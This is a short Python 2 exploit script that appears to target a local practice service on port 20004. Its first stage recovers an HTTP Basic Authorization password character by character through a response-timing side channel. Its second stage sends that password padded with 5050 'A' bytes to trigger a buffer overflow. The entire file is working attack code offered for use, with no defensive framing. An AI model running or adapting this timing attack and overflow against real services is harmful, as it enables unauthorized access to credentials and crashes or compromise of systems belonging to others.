#!/usr/bin/python
import socket
import struct
import time
import base64
import string



# Connect
def connect(IP, PORT):
	# send data
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IP, PORT))
	#s.settimeout(1)
	return s 

# create req
def req(method='GET', path='/./', protocol='HTTP/1.1', add = ''):
	REQ = ''
	REQ += '{} {} {}\r\n'.format(method, path, protocol)
	if add:
		REQ += 'Authorization: Basic '
		REQ += base64.encodestring(add)[:-1]
		REQ += '\n'*2
	#print '[+] Length Of Encoded String : ', len(base64.encodestring(add)) 
	return REQ

# Pass Extraction Function
def guess_pass(IP, PORT):
	gpass = ''
	l = string.ascii_letters+string.digits
	for x in range(18):
		print "[*] Total Character Guessed : ", gpass
		print "[*] Starting Guess Char : ",x
		print "[-] Tring : "
		for i in l:
			s= connect(IP, PORT)
			REQ = req(add=gpass+i)
			t1 = time.time()
			s.send(REQ)
			s.recv(1024)
			t2 = time.time()
			if (t2-t1)<0.002:
				print "[+] New Guess Detected : ", i
				print "[+] Time : ", t2-t1
				gpass += i
				s.close()
				break
			else:
				print i,
			s.close()
	return gpass


V = ('127.0.0.1', 20004)


raw_input("[-]	Stage 1 - Password Extraction .[-]\n[+] Ready [Press Enter To Start] : ")

PASS = guess_pass(*V)
print "[+] Password Found : ", PASS


raw_input("[-]	Stage 2 - Buffer Overflow Trigger	[-]")

s = connect(*V)
PASS += ''
PASS += 'A'*5050
REQ = req(add = PASS)
s.send(REQ)
print "[+] length : ", len(REQ)
time.sleep(1)
s.settimeout(3)
try:
	print s.recv(1024)
except:
	pass
s.close()

